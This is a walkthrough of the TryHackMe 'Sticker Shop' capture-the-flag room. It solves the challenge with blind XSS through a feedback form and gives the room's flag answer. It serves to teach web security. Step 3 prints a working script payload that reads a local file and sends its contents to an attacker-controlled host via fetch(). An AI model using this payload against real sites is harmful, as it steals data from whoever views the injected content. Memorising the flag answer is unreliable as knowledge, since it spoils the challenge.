# The Sticker Shop – TryHackMe Walkthrough

**Room:** [https://tryhackme.com/room/thestickershop](https://tryhackme.com/room/thestickershop)

---

## Introduction

Hey everyone! Welcome back to another TryHackMe write-up. This time, we're looking at **The Sticker Shop**—a room focused on web vulnerabilities and how something as simple as a feedback form can lead to full flag exfiltration.

The premise? A local sticker shop just launched their own website... hosted on the same computer they use to browse the internet and check customer feedback 🤦‍♂️. Our goal is to get the contents of `/flag.txt`.

---

## Step 1: Exploring the Webpage

The first thing I did was visit the target site:

```
http://<MACHINE_IP>:8080
```

I was greeted with a simple web interface. There were only two tabs: **Home** and **Feedback**.

![Screenshot From 2025-05-12 20-39-42](https://github.com/user-attachments/assets/2356792b-61ea-4866-9b55-62bc7da19b37)

Curious about the flag, I tried navigating directly to:

```
http://MACHINE_IP:8080/flag.txt
```
![Screenshot From 2025-05-12 20-38-21](https://github.com/user-attachments/assets/ff5b74bb-9f8f-40d1-af30-b5797d321bcd)

This gave me a **401 Unauthorized** error.

> **What does 401 mean?**
> It means the request requires valid authentication, and the server isn't letting you view the file directly.

---

## Step 2: Investigating the Feedback Form

Going back to the main page. I clicked the **Feedback** tab, I noticed a basic input box for comments.

![Screenshot From 2025-05-12 20-40-52](https://github.com/user-attachments/assets/6283cc3b-eb43-4a6c-838b-bd6d3c3bca11)

After submitting a few test entries, I realized this input might actually be **reviewed by a real person**—possibly on the same system where the flag is hosted.

That’s when I suspected a **Blind XSS** vulnerability.

---

## Step 3: Setting Up for Blind XSS

I spun up a Python HTTP server to catch callbacks:

```
python3 -m http.server 8000
```

Then I injected the following payload that I found online after a little bit of research; into the feedback field:

```
'"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://YOUR-IP:8000/?flag=' + encodeURIComponent(data))
    });
</script>
```

> This payload tells the victim’s browser (likely an admin reviewing feedback) to:
>
> * Grab the contents of `flag.txt`
> * Send it to my IP via the GET request

---

![Screenshot From 2025-05-12 21-19-13](https://github.com/user-attachments/assets/34110f3e-223c-42f3-b373-9f5659fa25c7)


## Step 4: Capturing the Flag

After submitting the feedback and waiting a bit, my Python server logged this:

![Screenshot From 2025-05-12 21-18-11](https://github.com/user-attachments/assets/c3e0be46-6b46-49e3-abe1-fb4ae67daeef)

Inside the request:

```
GET /?flag=THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

Success! We just stole the flag through a blind XSS injection.

---

## Final Answer

> **Question:** What is the content of flag.txt?

> **Answer:** `THM{83789a69074f636f64a38879cfcabe8b62305ee6}`

---

## Conclusion

This room was honestly fun and educational. I got hands-on with **Blind XSS**, learned how to exfiltrate sensitive files using a basic payload, and saw how dangerous poor input validation can be—especially when combined with bad system architecture.

Huge shoutout to the creators of this room. Excited to keep building out this series and sharing more write-ups soon. Thanks for reading 🙌

---

Let me know when you're ready for the next one!
